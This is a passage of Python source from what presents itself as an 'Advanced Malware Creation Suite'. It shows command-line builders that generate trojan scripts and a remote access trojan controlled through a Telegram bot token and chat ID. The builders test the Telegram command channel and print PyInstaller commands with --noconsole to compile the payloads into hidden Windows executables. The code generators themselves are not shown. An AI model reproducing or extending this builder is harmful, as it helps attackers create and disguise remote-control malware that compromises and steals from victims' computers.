    gui = MacroGUI()  # Reuse GUI class methods
    trojan_code = gui.generate_trojan_code(mode, features)
    
    # Save file
    trojan_file = os.path.join(output_dir, f"trojan_{int(time.time())}.py")
    with open(trojan_file, 'w') as f:
        f.write(trojan_code)
    
    print(f"✅ Trojan script created: {trojan_file}")
    
    compile_choice = input("\\nCompile to EXE? [y/N]: ").strip().lower()
    if compile_choice == 'y':
        print("\\n[!] PyInstaller compilation would run here")
        print("[!] Install: pip install pyinstaller")
        print(f"[!] Command: pyinstaller --onefile --noconsole {trojan_file}")

def build_rat_cli():
    """CLI for building RAT"""
    print("\\n[📱 RAT BUILDER]")
    
    bot_token = input("\\nTelegram Bot Token: ").strip()
    chat_id = input("Telegram Chat ID: ").strip()
    
    if not bot_token or not chat_id:
        print("[!] Both Bot Token and Chat ID are required")
        return
    
    # Test connection
    print("\\nTesting Telegram connection...")
    rat = TelegramRAT(bot_token, chat_id)
    test = rat.send_message("Macro RAT Test Connection ✅")
    
    if test and test.get('ok'):
        print("✅ Telegram connection successful!")
    else:
        print("❌ Telegram connection failed!")
        continue_anyway = input("Continue anyway? [y/N]: ").strip().lower()
        if continue_anyway != 'y':
            return
    
    # Create output directory
    output_dir = os.path.join(os.getcwd(), "builds")
    os.makedirs(output_dir, exist_ok=True)
    
    # Generate code
    print("\\nGenerating RAT code...")
    gui = MacroGUI()  # Reuse GUI class methods
    rat_code = gui.generate_rat_code(bot_token, chat_id)
    
    # Save file
    rat_file = os.path.join(output_dir, f"rat_{int(time.time())}.py")
    with open(rat_file, 'w') as f:
        f.write(rat_code)
    
    print(f"✅ RAT script created: {rat_file}")
    
    compile_choice = input("\\nCompile to EXE? [y/N]: ").strip().lower()
    if compile_choice == 'y':
        print("\\n[!] PyInstaller compilation would run here")
        print("[!] Install: pip install pyinstaller")
        print(f"[!] Command: pyinstaller --onefile --noconsole {rat_file}")

def test_telegram_cli():
    """CLI for testing Telegram connection"""
    print("\\n[🔍 TELEGRAM TEST]")
    
    bot_token = input("Bot Token: ").strip()
    chat_id = input("Chat ID: ").strip()
    
    if not bot_token or not chat_id:
        print("[!] Both fields are required")
        return
    
    rat = TelegramRAT(bot_token, chat_id)
    test = rat.send_message("Macro RAT Test Connection ✅")
    
    if test and test.get('ok'):
        print("✅ Telegram connection successful!")
    else:
        print("❌ Telegram connection failed!")
        print("Check your Bot Token and Chat ID")

# ========== MAIN ==========
def main():
    """Main entry point"""
    print(f"""
    ╔══════════════════════════════════════════════════════╗
    ║                 Macro v{VERSION}                        ║
    ║         Advanced Malware Creation Suite             ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    # Platform check
    if platform.system() != "Windows":
        print("[!] Warning: Macro is optimized for Windows")
        print("[!] Some features may not work on other platforms\\n")
    
    # Check for GUI
    if GUI_ENABLED and len(sys.argv) == 1:
        print("[*] Starting GUI mode...")
        app = MacroGUI()
        app.run()
    else:
        print("[*] Starting CLI mode...")
        cli_mode()

if __name__ == "__main__":
    main()
